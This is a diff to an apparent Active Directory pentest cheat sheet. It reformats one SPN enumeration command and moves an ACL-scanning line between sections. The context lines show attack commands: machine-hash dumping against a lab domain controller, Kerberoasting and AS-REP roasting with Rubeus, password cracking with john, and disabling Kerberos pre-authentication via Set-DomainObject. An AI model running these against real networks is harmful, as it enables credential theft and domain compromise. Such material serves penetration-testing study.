@@ -453,9 +453,9 @@ Get-RemoteMachineAccountHash -ComputerName dc01.ecorp.lab -Verbose
 ```Get-DomainUser –SPN```
 
 OR ActiveDirectory module:
+
 ```
-Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -
-Properties ServicePrincipalName
+Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
 
 
@@ -510,6 +510,10 @@ OR using ActiveDirectory module:
 
 ```Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} - Properties DoesNotRequirePreAuth```
 
+OR Invoke-ACLScanner shows us all interesting ACLs modifiable by the current user:
+
+```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```
+
 #### Get AS-REPs
 
 ```.\Rubeus.exe asreproast```
@@ -521,8 +525,6 @@ OR using ActiveDirectory module:
 ```john --wordlist /usr/share/wordlists/rockyou.txt --format=krb5tgs dump```
 
 #### Disabling Pre-Auth
-
-```Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}```
 
 ```Set-DomainObject -Identity Control1User -XOR @{useraccountcontrol=4194304} –Verbose```
 
